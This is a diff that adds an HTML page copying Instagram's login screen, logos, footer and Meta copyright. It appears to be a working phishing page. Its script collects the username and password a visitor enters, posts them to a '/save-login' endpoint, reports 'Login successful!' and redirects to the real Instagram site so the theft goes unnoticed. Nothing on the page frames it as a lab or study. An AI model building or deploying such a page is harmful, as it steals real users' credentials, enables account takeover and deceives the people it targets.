@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="shortcut icon" type="image/x-icon" href="instag.jpg" />
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="app"></div>
+    <div id="container">
+        <section>
+            <div class="main-top">
+                <div class="logo">
+                    <img src="Instagram_Logo_Large.png" alt="Instagram Logo">
+                </div>
+                <div>
+                    <input type="text" placeholder="Phone number, username, or email" id="username" class="username" />
+                    <div>
+                        <input type="password" placeholder="Password" id="password" class="password" />
+                    </div>
+                    <input type="button" value="Log in" class="login-btn" id="login-btn" />
+                </div>
+                <span class="or">—————— OR ——————</span>
+                <div class="main-bottom">
+                    <a href="#" class="logInFB"><i class="fab fa-facebook-f"></i> Log in with Facebook</a><br>
+                    <a href="#" class="forget">Forgot password?</a>
+                </div>
+            </div>
+            <div class="bottom">
+                <div class="signUp">
+                    Don't have an account? <a href="#">Sign up</a>
+                </div>
+            </div>
+            <div class="app-section">
+                <span>Get the app</span>
+                <div class="images">
+                    <img src="fDjwyLC88oO.png" alt="Google Play Image">
+                    <img src="_UbeIRgTpG-.png" alt="Microsoft Image">
+                </div>
+            </div>
+        </section>
+        <footer>
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Top Accounts</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Instagram Contact</a>
+            <a href="#">Uploading & Non-Users</a>
+            <div class="bottom-footer">
+                <span> &copy; 2024 Instagram from Meta</span>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const loginBtn = document.getElementById('login-btn');
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+
+            // `Enter` կոճակի իրադարձություն
+            document.addEventListener('keydown', (event) => {
+                if (event.key === 'Enter') {
+                    loginBtn.click();
+                }
+            });
+
+            loginBtn.addEventListener('click', async () => {
+                const username = usernameInput.value;
+                const password = passwordInput.value;
+
+                if (username === '' || password === '') {
+                    alert('Please fill out both fields.');
+                    return;
+                }
+
+                try {
+                    const response = await fetch('/save-login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ username, password }),
+                    });
+
+                    const result = await response.text();
+                    console.log('Server response:', result);
+
+                    if (response.ok) {
+                        alert('Login successful!');
+                        window.location.href = 'https://www.instagram.com/';
+                    } else {
+                        alert('Error saving login data.');
+                    }
+                } catch (error) {
+                    console.error('Error sending data:', error);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
